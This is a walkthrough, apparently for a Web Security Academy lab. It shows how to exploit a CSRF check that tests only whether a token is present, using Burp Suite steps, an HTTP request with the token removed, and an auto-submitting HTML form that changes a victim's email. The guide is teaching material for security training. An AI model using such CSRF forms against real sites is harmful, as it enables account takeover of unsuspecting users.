# Exploiting CSRF with Token Presence-Based Validation Bypass

This guide delivers a clear, creative, and organized walkthrough to exploit a **Cross-Site Request Forgery (CSRF)** vulnerability where token validation only checks for the presence of a CSRF token, not its validity. Imagine sneaking past a guard who only checks if you’re holding a badge—any badge! The objective is to craft a malicious form that omits the CSRF token entirely, changes a victim's email address, and solves the lab by exploiting this flawed validation.

## Objective
Bypass CSRF token validation by removing the `csrf` parameter, create an auto-submitting form to change a victim’s email address, and deliver the exploit via the lab’s exploit server.

## Prerequisites
- Burp Suite (Professional or Community Edition) with Proxy and Repeater modules configured.
- Access to the lab application with an account and an "Update email" feature.
- An exploit server provided by the lab (e.g., `YOUR-EXPLOIT-SERVER-ID.exploit-server.net`).
- Basic understanding of CSRF attacks, HTTP requests, and HTML form manipulation.

## Background on the Vulnerability
The application’s "Update email" feature checks for the presence of a `csrf` parameter in `POST` requests but does not verify its value. By omitting the `csrf` parameter entirely, attackers can forge requests that the server accepts, allowing unauthorized actions like changing a victim’s email address when they visit a malicious page.

## Steps to Solve the Lab

### Step 1: Capture the Update Email Request
1. Open Burp’s browser and log in to your lab account.
2. Navigate to the account page and submit the "Update email" form with a test email.
3. In Burp Suite, go to **Proxy > HTTP history** and locate the `POST /my-account/change-email` request.
4. **Observation**: The request includes a `csrf` parameter (e.g., `csrf=abc123`) and an `email` parameter (e.g., `email=your-email@web-security-academy.net`).

### Step 2: Test CSRF Token Validation
1. Right-click the `POST /my-account/change-email` request and select **Send to Repeater**.
2. In Repeater, modify the `csrf` parameter to an invalid value (e.g., `csrf=invalid`).
3. Send the request.
4. **Observation**: The request is rejected, confirming the server checks for the `csrf` parameter.
5. Delete the `csrf` parameter entirely:
   ```
   POST /my-account/change-email HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   
   email=your-email@web-security-academy.net
   ```
6. Send the request.
7. **Observation**: The request is accepted, indicating the server only validates the presence of the `csrf` parameter, not its value.

![payload suc](./img/CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present/CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present(1).png)
![payload suc](./img/CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present/CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present(2).png)

### Step 3: Generate the CSRF Exploit
#### Option 1: Burp Suite Professional
1. Right-click the `POST /my-account/change-email` request in Proxy history.
2. Select **Engagement tools > Generate CSRF PoC**.
3. Enable the **Include auto-submit script** option.
4. Click **Regenerate** to create the exploit HTML, ensuring the `csrf` parameter is omitted:
   ```html
   <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
       <input type="hidden" name="email" value="anything@web-security-academy.net">
   </form>
   <script>
       document.forms[0].submit();
   </script>
   ```
5. Copy the generated HTML.

#### Option 2: Burp Suite Community Edition
1. Right-click the `POST /my-account/change-email` request and select **Copy URL** to get the action URL (e.g., `https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email`).
2. Use the following HTML template, omitting the `csrf` parameter:
   ```html
   <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
       <input type="hidden" name="email" value="anything@web-security-academy.net">
   </form>
   <script>
       document.forms[0].submit();
   </script>
   ```
3. **Observation**: The form auto-submits a `POST` request without the `csrf` parameter, exploiting the validation flaw.

### Step 4: Host the Exploit
1. Go to the exploit server provided by the lab.
2. Paste the CSRF exploit HTML into the **Body** section.
3. Click **Store** to save the exploit.
4. **Observation**: The exploit is hosted at `https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net`.

### Step 5: Test the Exploit on Yourself
1. Click **View exploit** on the exploit server to load the malicious page in Burp’s browser.
2. Monitor **Proxy > HTTP history** to confirm the `POST /my-account/change-email` request is sent without a `csrf` parameter.
3. Check the response to verify the email was updated.
4. **Observation**: The exploit successfully changes your email, confirming it works.

### Step 6: Modify the Exploit for the Victim
1. Edit the exploit HTML on the exploit server, changing the `email` value to a different address (e.g., `victim@attacker.com`):
   ```html
   <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
       <input type="hidden" name="email" value="victim@attacker.com">
   </form>
   <script>
       document.forms[0].submit();
   </script>
   ```
2. Click **Store** to save the updated exploit.

### Step 7: Deliver the Exploit
1. On the exploit server, click **Deliver to victim**.
2. **Observation**: The lab simulates the victim visiting the malicious page, executing the `POST` request, and changing their email, solving the lab.

![payload suc](./img/CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present/CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present(3).png)
![payload suc](./img/CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present/CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present(4).png)

### Step 8: Verify Success
1. If the lab does not confirm completion, verify:
   - The `action` URL matches the lab’s `/my-account/change-email` endpoint.
   - The `csrf` parameter is omitted.
   - The `email` value is different from your own.
   - The exploit server’s log shows the malicious page was accessed.
2. **Observation**: Successful email change for the victim completes the lab.